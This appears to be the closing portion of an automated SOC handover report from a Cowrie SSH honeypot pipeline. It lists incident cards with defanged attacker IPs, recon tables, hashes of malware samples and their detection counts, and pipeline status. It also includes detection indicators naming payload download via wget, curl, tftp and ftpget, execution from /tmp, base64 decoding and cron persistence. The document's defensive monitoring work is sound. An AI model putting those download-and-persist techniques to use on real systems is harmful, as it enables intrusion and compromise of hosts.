- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d07354998d29

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:54 |
| **Last Seen** | 2026-08-21 08:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:54:12` | `cowrie.session.connect` |
| `2026-08-21 08:54:12` | `cowrie.client.version` |
| `2026-08-21 08:54:12` | `cowrie.client.kex` |
| `2026-08-21 08:54:14` | `cowrie.login.success` |
| `2026-08-21 08:54:14` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:54:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:54:15` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7586d7d4a12b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:54 |
| **Last Seen** | 2026-08-21 08:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:54:17` | `cowrie.session.connect` |
| `2026-08-21 08:54:18` | `cowrie.client.version` |
| `2026-08-21 08:54:18` | `cowrie.client.kex` |
| `2026-08-21 08:54:19` | `cowrie.login.success` |
| `2026-08-21 08:54:19` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:54:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:54:19` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405c377f89cc

| Field | Detail |
|---|---|
| **Source IP** | `175.205.103[.]66` |
| **First Seen** | 2026-08-21 08:54 |
| **Last Seen** | 2026-08-21 08:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:54:27` | `cowrie.session.connect` |
| `2026-08-21 08:54:28` | `cowrie.client.version` |
| `2026-08-21 08:54:28` | `cowrie.client.kex` |
| `2026-08-21 08:54:30` | `cowrie.login.success` |
| `2026-08-21 08:54:31` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.205.103[.]66` to AbuseIPDB if not already reported
- [ ] Block `175.205.103[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9f2fa54b18

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-08-21 08:54 |
| **Last Seen** | 2026-08-21 08:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:54:37` | `cowrie.session.connect` |
| `2026-08-21 08:54:38` | `cowrie.client.version` |
| `2026-08-21 08:54:38` | `cowrie.client.kex` |
| `2026-08-21 08:54:40` | `cowrie.login.success` |
| `2026-08-21 08:54:41` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-08-21 06:59 | 2026-08-21 08:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.9.215[.]184` | **4** | 2026-08-21 07:23 | 2026-08-21 07:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `5.134.48[.]9` | **4** | 2026-08-21 08:26 | 2026-08-21 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]196` | **3** | 2026-08-21 07:14 | 2026-08-21 07:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]43` | **3** | 2026-08-21 07:14 | 2026-08-21 07:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]50` | **3** | 2026-08-21 07:13 | 2026-08-21 07:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `72.238.124[.]107` | **3** | 2026-08-21 08:31 | 2026-08-21 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.152.209[.]0` | **3** | 2026-08-21 08:51 | 2026-08-21 08:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `80.251.153[.]178` | **3** | 2026-08-21 07:51 | 2026-08-21 08:27 | 3m | 0 | `T1592` | 🟢 LOW |
| `20.65.195[.]53` | **2** | 2026-08-21 08:53 | 2026-08-21 08:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-21 07:52 | 2026-08-21 08:04 | 1m | 0 | `T1592` | 🟢 LOW |
| `104.248.158[.]38` | 1 | 2026-08-21 07:05 | 2026-08-21 07:05 | 8s | 0 | `T1592` | 🟢 LOW |
| `176.12.132[.]63` | 1 | 2026-08-21 07:20 | 2026-08-21 07:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.97.203[.]162` | 1 | 2026-08-21 07:48 | 2026-08-21 07:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `38.224.56[.]103` | 1 | 2026-08-21 08:39 | 2026-08-21 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-08-21 07:37 | 2026-08-21 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-08-21 08:35 | 2026-08-21 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-08-21 07:37 | 2026-08-21 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.91[.]85` | 1 | 2026-08-21 08:05 | 2026-08-21 08:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.216.42[.]246` | 1 | 2026-08-21 08:28 | 2026-08-21 08:30 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `80.216.42[.]246` | SE | Tele2 Sverige AB | **100** ⚠️ | 1 |
| `65.20.205[.]197` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `121.8.209[.]94` | CN | CHINANET Guangdong province network | **100** ⚠️ | 22 |
| `176.12.132[.]63` | IL | Cellcom Fixed Line Communication L.P | **100** ⚠️ | 50 |
| `66.132.172[.]43` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `112.194.142[.]167` | CN | China Unicom Sichuan province network | **100** ⚠️ | 50 |
| `38.224.56[.]103` | CO | SISTEMAS, TELECOMUNICACIONES Y BIOMEDICOS DE COLOMBIA SAS | **100** ⚠️ | 1 |
| `177.135.209[.]177` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 1 |
| `8.152.209[.]0` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 1 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 5 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 137 cases |
| Tool 34  | Credential Extractor        | ✅ 89 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (19.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 16 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 20 recon entry/entries in table (11 group(s) consolidating 35 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-21T10:36:28Z_
